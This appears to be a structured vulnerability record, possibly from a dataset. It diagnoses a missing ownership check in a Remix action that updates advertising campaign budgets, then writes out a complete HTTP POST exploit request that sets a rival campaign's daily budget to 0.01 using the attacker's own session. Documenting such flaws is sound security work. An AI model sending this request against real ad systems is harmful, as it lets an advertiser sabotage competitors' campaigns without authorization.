diagnosis: The Remix action server function updates advertising campaign daily budgets by params.campaignId without checking that the campaign belongs to marketer.agencyId. An advertiser can manipulate budget spending limits of rival campaigns.
exploit_request:
POST /campaigns/cmp_holiday_sale_2025/budget HTTP/1.1
Host: ads.adnetwork.io
Cookie: session=marketer_jwt
Content-Type: application/x-www-form-urlencoded

dailyBudget=0.01
